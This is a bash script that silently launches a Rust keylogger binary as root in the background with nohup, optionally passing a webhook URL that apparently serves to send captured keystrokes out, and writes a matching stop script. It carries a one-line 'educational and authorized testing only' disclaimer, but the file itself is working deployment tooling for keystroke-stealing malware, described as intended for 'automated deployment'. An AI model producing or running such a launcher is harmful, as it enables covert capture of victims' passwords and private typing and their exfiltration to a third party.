#!/bin/bash

# Rust Keylogger Auto-run Script (Silent/Non-Interactive Mode)
# For automated deployment scenarios
# WARNING: For Educational and Authorized Security Testing Only!
# Unauthorized use may be illegal in your jurisdiction.

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Check if the binary exists
BINARY_PATH="$SCRIPT_DIR/rust-key"
if [ ! -f "$BINARY_PATH" ]; then
    echo "Error: rust-key binary not found at $BINARY_PATH" >&2
    exit 1
fi

# Make the binary executable if it isn't already
chmod +x "$BINARY_PATH" 2>/dev/null || true

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Error: This script must be run with sudo/root privileges" >&2
    exit 1
fi

# Get webhook URL from first argument if provided
WEBHOOK_URL="$1"

# Change to the script directory
cd "$SCRIPT_DIR" || exit 1

# Create a log directory if it doesn't exist
mkdir -p "$SCRIPT_DIR/logs"

# Run the keylogger
if [ -n "$WEBHOOK_URL" ]; then
    nohup "$BINARY_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
    KEYLOGGER_PID=$!
else
    nohup "$BINARY_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
    KEYLOGGER_PID=$!
fi

# Store PID for later reference
echo "$KEYLOGGER_PID" > "$SCRIPT_DIR/logs/keylogger.pid"

# Create a stop script
cat > "$SCRIPT_DIR/stop_keylogger.sh" << EOF
#!/bin/bash
PID=\$(cat "$SCRIPT_DIR/logs/keylogger.pid" 2>/dev/null)
if [ -n "\$PID" ] && sudo kill \$PID 2>/dev/null; then
    echo "Keylogger stopped"
    rm -f "$SCRIPT_DIR/logs/keylogger.pid"
else
    echo "Keylogger not found or already stopped" >&2
fi
EOF

chmod +x "$SCRIPT_DIR/stop_keylogger.sh" 2>/dev/null || true

# Output success message
echo "Keylogger started (PID: $KEYLOGGER_PID)"
echo "Log file: $SCRIPT_DIR/logs/keylog.txt"
if [ -n "$WEBHOOK_URL" ]; then
    echo "Webhook: $WEBHOOK_URL"
fi
echo "Stop script: $SCRIPT_DIR/stop_keylogger.sh"

exit 0
